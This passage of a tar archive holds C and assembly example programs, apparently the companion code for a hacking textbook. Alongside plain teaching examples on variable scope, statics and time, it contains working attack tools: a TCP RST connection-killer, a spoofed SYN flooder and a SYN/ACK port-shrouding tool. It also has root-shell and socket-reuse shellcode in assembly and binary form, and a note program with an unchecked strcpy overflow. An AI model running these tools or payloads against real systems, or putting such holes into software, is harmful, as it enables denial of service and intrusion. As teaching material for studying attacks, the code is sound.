  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])

             rand_example.c                                                                                      0000644 0001747 0001747 00000000467 12564742435 013206  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>

int main() {
	int i;
	printf("RAND_MAX is %u\n", RAND_MAX);
	srand(time(0));

	printf("random values from 0 to RAND_MAX\n");
	for(i=0; i < 8; i++)
		printf("%d\n", rand());
	printf("random values from 1 to 20\n");
	for(i=0; i < 8; i++)
		printf("%d\n", (rand()%20)+1);
}
                                                                                                                                                                                                         raw_tcpsniff.c                                                                                      0000644 0001747 0001747 00000000747 12564742435 013235  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "hacking.h"

int main(void) {
   int i, recv_length, sockfd;
   u_char buffer[9000];

   if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
      fatal("in socket");

   for(i=0; i < 3; i++) {
      recv_length = recv(sockfd, buffer, 8000, 0);
      printf("Got a %d byte packet\n", recv_length);
      dump(buffer, recv_length);
   }
}
                         rst_hijack.c                                                                                        0000644 0001747 0001747 00000011070 12564742435 012660  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <libnet.h>
#include <pcap.h>
#include "hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass {
   int libnet_handle;
   u_char *packet;
};

int main(int argc, char *argv[]) {
   struct pcap_pkthdr cap_header;
   const u_char *packet, *pkt_data;
   pcap_t *pcap_handle;
   char errbuf[PCAP_ERRBUF_SIZE]; // same size as LIBNET_ERRBUF_SIZE
   char *device;
   u_long target_ip;
   int network;
   struct data_pass critical_libnet_data;

   if(argc < 1) {
      printf("Usage: %s <target IP>\n", argv[0]);
      exit(0);
   }
   target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);

   if (target_ip == -1)
      fatal("Invalid target address");

   device = pcap_lookupdev(errbuf);
   if(device == NULL)
      fatal(errbuf);

   pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
   if(pcap_handle == NULL)
      fatal(errbuf);

   critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
   if(critical_libnet_data.libnet_handle == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must run as root.\n");

   libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
   if (critical_libnet_data.packet == NULL)
      libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

   libnet_seed_prand();

   set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

   printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
   pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

   pcap_close(pcap_handle);
}

/* sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {
   struct bpf_program filter;
   char filter_string[100];

   sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

   printf("DEBUG: filter string is \'%s\'\n", filter_string);
   if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
      fatal("pcap_compile failed");

   if(pcap_setfilter(pcap_hdl, &filter) == -1)
      fatal("pcap_setfilter failed");
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
   u_char *pkt_data;
   struct libnet_ip_hdr *IPhdr;
   struct libnet_tcp_hdr *TCPhdr;
   struct data_pass *passed;
   int bcount;

   passed = (struct data_pass *) user_args; // pass data using a pointer to a struct 

   IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);
   TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

   printf("resetting TCP connection from %s:%d ",
         inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
   printf("<---> %s:%d\n", 
         inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));

   libnet_build_ip(LIBNET_TCP_H,      // size of the packet sans IP header 
      IPTOS_LOWDELAY,                 // IP tos 
      libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 
      0,                              // frag stuff 
      libnet_get_prand(LIBNET_PR8),   // TTL (randomized) 
      IPPROTO_TCP,                    // transport protocol 
      *((u_long *)&(IPhdr->ip_dst)),  // source IP (pretend we are dst) 
      *((u_long *)&(IPhdr->ip_src)),  // destination IP (send back to src) 
      NULL,                           // payload (none) 
      0,                              // payload length 
      passed->packet);                // packet header memory 

   libnet_build_tcp(htons(TCPhdr->th_dport),// source TCP port (pretend we are dst) 
      htons(TCPhdr->th_sport),        // destination TCP port (send back to src) 
      htonl(TCPhdr->th_ack),          // sequence number (use previous ack) 
      libnet_get_prand(LIBNET_PRu32), // acknowledgement number (randomized) 
      TH_RST,                         // control flags (RST flag set only) 
      libnet_get_prand(LIBNET_PRu16), // window size (randomized) 
      0,                              // urgent pointer 
      NULL,                           // payload (none) 
      0,                              // payload length 
      (passed->packet) + LIBNET_IP_H);// packet header memory 

   if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

   bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);
   if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
      libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");

   usleep(5000); // pause slightly
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        scope2.c                                                                                            0000644 0001747 0001747 00000001314 12564742435 011732  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int j = 42; // j is a global variable

void func3() {
   int i = 11, j = 999; // here, j is a local variable of func3()
   printf("\t\t\t[in func3] i = %d, j = %d\n", i, j);
}

void func2() {
   int i = 7;
   printf("\t\t[in func2] i = %d, j = %d\n", i, j);
   printf("\t\t[in func2] setting j = 1337\n");
   j = 1337; // writing to j
   func3();
   printf("\t\t[back in func2] i = %d, j = %d\n", i, j);
}

void func1() {
   int i = 5;
   printf("\t[in func1] i = %d, j = %d\n", i, j);
   func2();
   printf("\t[back in func1] i = %d, j = %d\n", i, j);
}

int main() {
   int i = 3;
   printf("[in main] i = %d, j = %d\n", i, j);
   func1();
   printf("[back in main] i = %d, j = %d\n", i, j);
}
                                                                                                                                                                                                                                                                                                                    scope3.c                                                                                            0000644 0001747 0001747 00000002127 12564742435 011736  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int j = 42; // j is a global variable

void func3() {
   int i = 11, j = 999; // here, j is a local variable of func3()
   printf("\t\t\t[in func3] i @ 0x%08x = %d\n", &i, i);
   printf("\t\t\t[in func3] j @ 0x%08x = %d\n", &j, j);
}

void func2() {
   int i = 7;
   printf("\t\t[in func2] i @ 0x%08x = %d\n", &i, i);
   printf("\t\t[in func2] j @ 0x%08x = %d\n", &j, j);
   printf("\t\t[in func2] setting j = 1337\n");
   j = 1337; // writing to j
   func3();
   printf("\t\t[back in func2] i @ 0x%08x = %d\n", &i, i);
   printf("\t\t[back in func2] j @ 0x%08x = %d\n", &j, j);
}

void func1() {
   int i = 5;
   printf("\t[in func1] i @ 0x%08x = %d\n", &i, i);
   printf("\t[in func1] j @ 0x%08x = %d\n", &j, j);
   func2();
   printf("\t[back in func1] i @ 0x%08x = %d\n", &i, i);
   printf("\t[back in func1] j @ 0x%08x = %d\n", &j, j);
}

int main() {
   int i = 3;
   printf("[in main] i @ 0x%08x = %d\n", &i, i);
   printf("[in main] j @ 0x%08x = %d\n", &j, j);
   func1();
   printf("[back in main] i @ 0x%08x = %d\n", &i, i);
   printf("[back in main] j @ 0x%08x = %d\n", &j, j);
}
                                                                                                                                                                                                                                                                                                                                                                                                                                         scope.c                                                                                             0000644 0001747 0001747 00000000730 12564742435 011651  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

void func3() {
   int i = 11;
   printf("\t\t\t[in func3] i = %d\n", i);
}

void func2() {
   int i = 7;
   printf("\t\t[in func2] i = %d\n", i);
   func3();
   printf("\t\t[back in func2] i = %d\n", i);
}

void func1() {
   int i = 5;
   printf("\t[in func1] i = %d\n", i);
   func2();
   printf("\t[back in func1] i = %d\n", i);
}

int main() {
   int i = 3;
   printf("[in main] i = %d\n", i);
   func1();
   printf("[back in main] i = %d\n", i);
}
                                        shellcode                                                                                           0000644 0001747 0001747 00000000043 12564742435 012256  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 1�1�1ə��̀jXQh//shh/bin��Q��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             shellcode.bin                                                                                       0000644 0001747 0001747 00000000043 12564742435 013025  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 1�1�1ə��̀jXQh//shh/bin��Q��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             shellcode.s                                                                                         0000644 0001747 0001747 00000002011 12564742435 012514  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; zero out eax
  xor ebx, ebx      ; zero out ebx
  xor ecx, ecx      ; zero out ecx
  cdq               ; zero out edx using the sign bit from eax
  mov BYTE al, 0xa4 ; syscall 164 (0xa4)
  int 0x80          ; setresuid(0, 0, 0)  restore all root privs

; execve(const char *filename, char *const argv [], char *const envp[])
  push BYTE 11      ; push 11 to the stack
  pop eax           ; pop dword of 11 into eax
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       shroud.c                                                                                            0000644 0001747 0001747 00000012546 12564742435 012054  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <libnet.h>
#include <pcap.h>
#include "hacking.h"

#define MAX_EXISTING_PORTS 30

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *, u_short *);

struct data_pass {
   int libnet_handle;
   u_char *packet;
};

int main(int argc, char *argv[]) {
   struct pcap_pkthdr cap_header;
   const u_char *packet, *pkt_data;
   pcap_t *pcap_handle;
   char errbuf[PCAP_ERRBUF_SIZE]; // same size as LIBNET_ERRBUF_SIZE
   char *device;
   u_long target_ip;
   int network, i;
   struct data_pass critical_libnet_data;
   u_short existing_ports[MAX_EXISTING_PORTS];

   if((argc < 2) || (argc > MAX_EXISTING_PORTS+2)) {
      if(argc > 2)
         printf("Limited to tracking %d existing ports.\n", MAX_EXISTING_PORTS);
      else
         printf("Usage: %s <IP to shroud> [existing ports...]\n", argv[0]);
      exit(0);
   }

   target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);
   if (target_ip == -1)
      fatal("Invalid target address");

   for(i=2; i < argc; i++)
      existing_ports[i-2] = (u_short) atoi(argv[i]);

   existing_ports[argc-2] = 0;

   device = pcap_lookupdev(errbuf);
   if(device == NULL)
      fatal(errbuf);

   pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
   if(pcap_handle == NULL)
      fatal(errbuf);

   critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
   if(critical_libnet_data.libnet_handle == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must run as root.\n");

   libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
   if (critical_libnet_data.packet == NULL)
      libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

   libnet_seed_prand();

   set_packet_filter(pcap_handle, (struct in_addr *)&target_ip, existing_ports);

   pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);
   pcap_close(pcap_handle);
}

/* sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip, u_short *ports) {
   struct bpf_program filter;
   char *str_ptr, filter_string[90 + (25 * MAX_EXISTING_PORTS)];
   int i=0;

   sprintf(filter_string, "dst host %s and ", inet_ntoa(*target_ip)); // target IP 
   strcat(filter_string, "tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0");

   if(ports[0] != 0) { // if there is at least one existing port
      str_ptr = filter_string + strlen(filter_string);
      if(ports[1] == 0) // there is only one existing port
         sprintf(str_ptr, " and not dst port %hu", ports[i]);
      else { // two or more existing ports
         sprintf(str_ptr, " and not (dst port %hu", ports[i++]);
         while(ports[i] != 0) {
            str_ptr = filter_string + strlen(filter_string);
            sprintf(str_ptr, " or dst port %hu", ports[i++]);
         }
         strcat(filter_string, ")"); 
      }
   }
   printf("DEBUG: filter string is \'%s\'\n", filter_string);
   if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
      fatal("pcap_compile failed");

   if(pcap_setfilter(pcap_hdl, &filter) == -1)
      fatal("pcap_setfilter failed");
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
   u_char *pkt_data;
   struct libnet_ip_hdr *IPhdr;
   struct libnet_tcp_hdr *TCPhdr;
   struct data_pass *passed;
   int bcount;

   passed = (struct data_pass *) user_args; // pass data using a pointer to a struct 

   IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);
   TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

   libnet_build_ip(LIBNET_TCP_H,      // size of the packet sans IP header 
      IPTOS_LOWDELAY,                 // IP tos 
      libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 
      0,                              // frag stuff 
      libnet_get_prand(LIBNET_PR8),   // TTL (randomized) 
      IPPROTO_TCP,                    // transport protocol 
      *((u_long *)&(IPhdr->ip_dst)),  // source IP (pretend we are dst) 
      *((u_long *)&(IPhdr->ip_src)),  // destination IP (send back to src) 
      NULL,                           // payload (none) 
      0,                              // payload length 
      passed->packet);                // packet header memory 

   libnet_build_tcp(htons(TCPhdr->th_dport),// source TCP port (pretend we are dst) 
      htons(TCPhdr->th_sport),        // destination TCP port (send back to src) 
      htonl(TCPhdr->th_ack),          // sequence number (use previous ack) 
      htonl((TCPhdr->th_seq) + 1),    // acknowledgement number (SYN's seq # + 1) 
      TH_SYN | TH_ACK,                // control flags (RST flag set only) 
      libnet_get_prand(LIBNET_PRu16), // window size (randomized) 
      0,                              // urgent pointer 
      NULL,                           // payload (none) 
      0,                              // payload length 
      (passed->packet) + LIBNET_IP_H);// packet header memory 

   if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

   bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);
   if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
      libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");
   printf("bing!\n");
}
                                                                                                                                                          signal_example.c                                                                                    0000644 0001747 0001747 00000004026 12564742435 013532  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h> 
#include <stdlib.h>
#include <signal.h> 
/* some labeled signal defines from signal.h 
 * #define SIGHUP        1  hangup 
 * #define SIGINT        2  interrupt  (Ctrl-C) 
 * #define SIGQUIT       3  quit (Ctrl-\) 
 * #define SIGILL        4  illegal instruction 
 * #define SIGTRAP       5  trace/breakpoint trap 
 * #define SIGABRT       6  process aborted 
 * #define SIGBUS        7  bus error 
 * #define SIGFPE        8  floating point error 
 * #define SIGKILL       9  kill 
 * #define SIGUSR1      10  user defined signal 1 
 * #define SIGSEGV      11  segmentation fault 
 * #define SIGUSR2      12  user defined signal 2 
 * #define SIGPIPE      13  write to pipe with no one reading 
 * #define SIGALRM      14  countdown alarm set by alarm() 
 * #define SIGTERM      15  termination (sent by kill command) 
 * #define SIGCHLD      17  child process signal 
 * #define SIGCONT      18  continue if stopped 
 * #define SIGSTOP      19  stop (pause execution) 
 * #define SIGTSTP      20  terminal stop [suspend] (Ctrl-Z) 
 * #define SIGTTIN      21  background process trying to read stdin 
 * #define SIGTTOU      22  background process trying to read stdout 
 */ 

/* a signal handler */ 
void signal_handler(int signal) { 
   printf("Caught signal %d\t", signal); 
   if (signal == SIGTSTP) 
      printf("SIGTSTP (Ctrl-Z)"); 
   else if (signal == SIGQUIT) 
      printf("SIGQUIT (Ctrl-\\)"); 
   else if (signal == SIGUSR1) 
      printf("SIGUSR1"); 
   else if (signal == SIGUSR2) 
      printf("SIGUSR2"); 

   printf("\n"); 
} 

void sigint_handler(int x) { 
   printf("Caught a Ctrl-C (SIGINT) in a separate handler\nExiting..\n"); 
   exit(0); 
} 

int main() { 
   /* registering signal handlers */ 
   signal(SIGQUIT, signal_handler); // set signal_handler() as the 
   signal(SIGTSTP, signal_handler); // signal handler for these 
   signal(SIGUSR1, signal_handler); // signals 
   signal(SIGUSR2, signal_handler); 

   signal(SIGINT, sigint_handler);  // set sigint_handler() for SIGINT 

   while(1) {}  // loop forever 
} 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          simplenote.c                                                                                        0000644 0001747 0001747 00000003520 12564742435 012717  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

void usage(char *prog_name, char *filename) {
   printf("Usage: %s <data to add to %s>\n", prog_name, filename);
   exit(0);
}

void fatal(char *);            // a function for fatal errors
void *ec_malloc(unsigned int); // an errorchecked malloc() wrapper

int main(int argc, char *argv[]) {
   int fd; // file descriptor
   char *buffer, *datafile;

   buffer = (char *) ec_malloc(100);
   datafile = (char *) ec_malloc(20);
   strcpy(datafile, "/tmp/notes");

   if(argc < 2)                 // If there aren't commandline arguments
      usage(argv[0], datafile); // display usage message and exit

   strcpy(buffer, argv[1]);  // copy into buffer

   printf("[DEBUG] buffer   @ %p: \'%s\'\n", buffer, buffer);
   printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);

   strncat(buffer, "\n", 1); // add a newline on the end
	  
// Opening the file
   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
   if(fd == -1)
      fatal("in main() while opening file");
   printf("[DEBUG] file descriptor is %d\n", fd);
// Writing data
   if(write(fd, buffer, strlen(buffer)) == -1)
      fatal("in main() while writing buffer to file");
// Closing file
   if(close(fd) == -1)
      fatal("in main() while closing file");

   printf("Note has been saved.\n");
   free(buffer);
   free(datafile);
}

// A function to display an error message and then exit
void fatal(char *message) {
   char error_message[100];

   strcpy(error_message, "[!!] Fatal Error ");
   strncat(error_message, message, 83);
   perror(error_message);
   exit(-1);
}

// An error checked malloc() wrapper function
void *ec_malloc(unsigned int size) {
   void *ptr;
   ptr = malloc(size);
   if(ptr == NULL)
      fatal("in ec_malloc() on memory allocation");
   return ptr;
}
                                                                                                                                                                                simple_server.c                                                                                     0000644 0001747 0001747 00000003237 12564742435 013424  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "hacking.h"

#define PORT 7890	// the port users will be connecting to

int main(void) {
	int sockfd, new_sockfd;  // listen on sock_fd, new connection on new_fd
	struct sockaddr_in host_addr, client_addr;	// my address information
	socklen_t sin_size;
	int recv_length=1, yes=1;
	char buffer[1024];

	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		fatal("in socket");

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		fatal("setting socket option SO_REUSEADDR");
	
	host_addr.sin_family = AF_INET;		 // host byte order
	host_addr.sin_port = htons(PORT);	 // short, network byte order
	host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP
	memset(&(host_addr.sin_zero), '\0', 8); // zero the rest of the struct

	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
		fatal("binding to socket");

	if (listen(sockfd, 5) == -1)
		fatal("listening on socket");

	while(1) {    // Accept loop
		sin_size = sizeof(struct sockaddr_in);
		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
		if(new_sockfd == -1)
			fatal("accepting connection");
		printf("server: got connection from %s port %d\n",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		send(new_sockfd, "Hello World!\n", 13, 0);
		recv_length = recv(new_sockfd, &buffer, 1024, 0);
		while(recv_length > 0) {
			printf("RECV: %d bytes\n", recv_length);
			dump(buffer, recv_length);
			recv_length = recv(new_sockfd, &buffer, 1024, 0);
		}
		close(new_sockfd);
	}
	return 0;
}

                                                                                                                                                                                                                                                                                                                                                                 socket_reuse_restore                                                                                0000644 0001747 0001747 00000000076 12564742435 014560  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jX̀��t
�l$hh��ÍT$\�jY1�1Ұ?̀Iy��Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                                  socket_reuse_restore.s                                                                              0000644 0001747 0001747 00000002705 12564742435 015022  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

   push BYTE 0x02    ; fork is syscall #2
   pop eax
   int 0x80          ; after the fork, in child process eax == 0
   test eax, eax
   jz child_process  ; in child process spawn a shell

      ; in the parent process, restore tinywebd
   lea ebp, [esp+0x68]  ; restore EBP
   push 0x08048fb7      ; return address
   ret                  ; return

child_process:
    ; re-use existing socket
   lea edx, [esp+0x5c]  ; put the address of new_sockfd in edx
   mov ebx, [edx]       ; put the value of new_sockfd in ebx
   push BYTE 0x02
   pop ecx          ; ecx starts at 2
   xor eax, eax
   xor edx, edx
dup_loop:
   mov BYTE al, 0x3F ; dup2  syscall #63
   int 0x80          ; dup2(c, 0)
   dec ecx           ; count down to 0 
   jns dup_loop      ; if the sign flag is not set, ecx is not negative


; execve(const char *filename, char *const argv [], char *const envp[])
   mov BYTE al, 11   ; execve  syscall #11
   push edx          ; push some nulls for string termination
   push 0x68732f2f   ; push "//sh" to the stack
   push 0x6e69622f   ; push "/bin" to the stack
   mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
   push edx          ; push 32-bit null terminator to stack
   mov edx, esp      ; this is an empty array for envp
   push ebx          ; push string addr to stack above null terminator
   mov ecx, esp      ; this is the argv array with string ptr
   int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                           stack_example.c                                                                                     0000644 0001747 0001747 00000000250 12564742435 013355  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 void test_function(int a, int b, int c, int d) {
   int flag;
   char buffer[10];

   flag = 31337;
   buffer[0] = 'A';
}

int main() {
   test_function(1, 2, 3, 4);
}
                                                                                                                                                                                                                                                                                                                                                        static2.c                                                                                           0000644 0001747 0001747 00000001231 12564742435 012106  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

void function() { // an example function, with it's own context
	int var = 5;
	static int static_var = 5; // static variable initialization

	printf("\t[in function] var  @ %p = %d\n", &var, var);
	printf("\t[in function] static_var @ %p = %d\n", &static_var, static_var);
	var++;          // add one to var
	static_var++;   // add one to static_var
}

int main() { // the main function, with it's own context
	int i;
	static int static_var = 1337; // another static, in a different context

	for(i=0; i < 5; i++) { // loop 5 times
		printf("[in main] static_var @ %p = %d\n", &static_var, static_var);
		function(); // call the function
	}
}
	
                                                                                                                                                                                                                                                                                                                                                                       static.c                                                                                            0000644 0001747 0001747 00000001151 12564742435 012025  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

void function() { // an example function, with it's own context
	int var = 5;
	static int static_var = 5; // static variable initialization

	printf("\t[in function] var = %d\n", var);
	printf("\t[in function] static_var = %d\n", static_var);
	var++;          // add one to var
	static_var++;   // add one to static_var
}

int main() { // the main function, with it's own context
	int i;
	static int static_var = 1337; // another static, in a different context

	for(i=0; i < 5; i++) { // loop 5 times
		printf("[in main] static_var = %d\n", static_var);
		function(); // call the function
	}
}
	
                                                                                                                                                                                                                                                                                                                                                                                                                       synflood.c                                                                                          0000644 0001747 0001747 00000006374 12564742435 012407  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <libnet.h>

#define FLOOD_DELAY 5000 // delay between packet injects by 5000 ms 

/* returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr) {
   return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}


int main(int argc, char *argv[]) {
   u_long dest_ip;
   u_short dest_port;
   u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
   int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

   if(argc < 3)
   {
      printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
      exit(1);
   }

   dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // the host 
   dest_port = (u_short) atoi(argv[2]); // the port 


   network = libnet_open_raw_sock(IPPROTO_RAW); // open network interface 
   if (network == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must run as root.\n");

   libnet_init_packet(packet_size, &packet); // allocate memory for packet 
   if (packet == NULL)
      libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

   libnet_seed_prand(); // seed the random number generator 

   printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
   while(1) // loop forever (until break by CTRL-C) 
   {
      libnet_build_ip(LIBNET_TCP_H,      // size of the packet sans IP header 
         IPTOS_LOWDELAY,                 // IP tos 
         libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 
         0,                              // frag stuff 
         libnet_get_prand(LIBNET_PR8),   // TTL (randomized) 
         IPPROTO_TCP,                    // transport protocol 
         libnet_get_prand(LIBNET_PRu32), // source IP (randomized) 
         dest_ip,                        // destination IP 
         NULL,                           // payload (none) 
         0,                              // payload length 
         packet);                        // packet header memory 

      libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // source TCP port (random) 
         dest_port,                      // destination TCP port 
         libnet_get_prand(LIBNET_PRu32), // sequence number (randomized) 
         libnet_get_prand(LIBNET_PRu32), // acknowledgement number (randomized) 
         TH_SYN,                         // control flags (SYN flag set only) 
         libnet_get_prand(LIBNET_PRu16), // window size (randomized) 
         0,                              // urgent pointer 
         NULL,                           // payload (none) 
         0,                              // payload length 
         packet + LIBNET_IP_H);          // packet header memory 

      if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
         libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

      byte_count = libnet_write_ip(network, packet, packet_size); // inject packet 
      if (byte_count < packet_size)
         libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.  (%d of %d bytes)", byte_count, packet_size);

      usleep(FLOOD_DELAY); // wait for FLOOD_DELAY milliseconds  
   }

   libnet_destroy_packet(&packet); // free packet memory 

   if (libnet_close_raw_sock(network) == -1) // close the network interface 
      libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

   return 0;
}


                                                                                                                                                                                                                                                                    time_example2.c                                                                                     0000644 0001747 0001747 00000002606 12564742435 013277  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <time.h>

void dump_time_struct_bytes(struct tm *time_ptr, int size) {
	int i;
	unsigned char *raw_ptr;

	printf("bytes of struct located at 0x%08x\n", time_ptr);
	raw_ptr = (unsigned char *) time_ptr;
	for(i=0; i < size; i++)
	{
		printf("%02x ", raw_ptr[i]);
		if(i%16 == 15) // print a newline every 16 bytes
			printf("\n");
	}
	printf("\n");
}

int main() {
	long int seconds_since_epoch;
	struct tm current_time, *time_ptr;
	int hour, minute, second, i, *int_ptr;

	seconds_since_epoch = time(0); // pass time a null pointer as argument
	printf("time() - seconds since epoch: %ld\n", seconds_since_epoch);

	time_ptr = &current_time;  // set time_ptr to the address of
                              // the current_time struct
	localtime_r(&seconds_since_epoch, time_ptr);

	// three different ways to access struct elements
	hour = current_time.tm_hour;  // direct access
	minute = time_ptr->tm_min;    // access via pointer
	second = *((int *) time_ptr); // hacky pointer access

	printf("Current time is: %02d:%02d:%02d\n", hour, minute, second);

	dump_time_struct_bytes(time_ptr, sizeof(struct tm));

	minute = hour = 0;  // clear out minute and hour
	int_ptr = (int *) time_ptr;

	for(i=0; i < 3; i++) {
		printf("int_ptr @ 0x%08x : %d\n", int_ptr, *int_ptr);
		int_ptr++; // adding 1 to int_ptr adds 4 to the address,
	}             // since an int is 4 bytes in size
}
	
	
                                                                                                                          time_example.c                                                                                      0000644 0001747 0001747 00000001362 12564742435 013213  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <time.h>

int main() {
	long int seconds_since_epoch;
	struct tm current_time, *time_ptr;
	int hour, minute, second, day, month, year;

	seconds_since_epoch = time(0); // pass time a null pointer as argument
	printf("time() - seconds since epoch: %ld\n", seconds_since_epoch);

